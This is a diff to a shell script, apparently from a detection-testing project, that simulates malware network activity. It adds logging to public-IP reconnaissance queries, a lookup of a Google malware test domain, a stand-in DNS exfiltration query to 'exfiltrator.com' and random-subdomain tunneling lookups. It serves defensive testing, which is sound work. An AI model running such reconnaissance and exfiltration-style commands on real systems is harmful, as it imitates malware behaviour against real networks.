@@ -2,9 +2,9 @@
 
 # ================================
 # Scenario: Malicious DNS Lookup & Public IP Reconnaissance
+# Author: toquiwokey
 # Type: Network
 # Description:
-# Author: toquiwokey
 # - Simulates malware querying external DNS services to determine its 
 #   public IP address or contact a C2 (Command & Control) server.
 # - Uses a combination of public IP checkers and a safe test domain 
@@ -12,27 +12,48 @@
 # - Security agents should detect:
 #   - Unexpected outbound DNS queries
 #   - Suspicious HTTP/S requests to known reconnaissance services
+#   - Potential DNS tunneling or exfiltration attempts
 # ================================
 
-# 1. Public IP Reconnaissance (Malware often does this to check its external IP)
-curl -s http://icanhazip.com
+# 📂 Define Log Directory & File
+LOG_DIR="/var/log/nastycontainer/dns_recon"
+LOG_FILE="$LOG_DIR/dns_recon.log"
 
-# Alternative methods:
+# 🏗 Ensure the log directory exists
+mkdir -p "$LOG_DIR"
+
+# 📝 Redirect all stdout & stderr to both the log file and console
+exec > >(tee -a "$LOG_FILE") 2>&1
+
+echo "===== Starting Malicious DNS & Network Recon Scenario ====="
+
+# 1️⃣ Public IP Reconnaissance (Simulates malware fingerprinting its external IP)
+echo "[INFO] Checking public IP..."
+echo "[INFO] Querying icanhazip.com..."
+curl -s http://icanhazip.com
+echo "[INFO] Querying checkip.amazonaws.com..."
 curl -s http://checkip.amazonaws.com
+echo "[INFO] Querying ifconfig.me..."
 wget -qO- http://ifconfig.me
+echo "[INFO] Querying OpenDNS Resolver..."
 dig +short myip.opendns.com @resolver1.opendns.com
 
-# 2. Query a Known Safe Malware Test Domain (Used to test detection tools)
+# 2️⃣ DNS Query to Safe Google Malware Test Domain
+echo "[INFO] Querying Google's safe malware test domain..."
 nslookup malware.testing.google.test
 dig @8.8.8.8 malware.testing.google.test
 
-# 3. DNS Exfiltration Simulation (Encoded data in subdomains)
-# - Some malware hides stolen data inside DNS queries to bypass firewalls.
-# - This simulates a DNS exfiltration attempt.
+# 3️⃣ DNS Exfiltration Simulation (Mimics malware stealing data over DNS)
+echo "[INFO] Simulating DNS exfiltration..."
 dig exampledata123.exfiltrator.com @8.8.8.8
 
-# 4. DNS Tunneling Attempt (Mimicking covert C2 communication)
-# - Some malware establishes a C2 channel using DNS queries.
-# - Here, we simulate repeated lookups of a random domain.
-for i in {1..5}; do dig $(openssl rand -hex 6).malware.testing.google.test @8.8.8.8; done
+# 4️⃣ DNS Tunneling Attempt (Mimics covert C2 communication)
+echo "[INFO] Simulating DNS tunneling..."
+for i in {1..5}; do 
+    DIG_QUERY=$(openssl rand -hex 6).malware.testing.google.test
+    echo "[INFO] Querying: $DIG_QUERY"
+    dig "$DIG_QUERY" @8.8.8.8
+done
+
+echo "===== Scenario Completed, Logs Saved to $LOG_FILE ====="
 
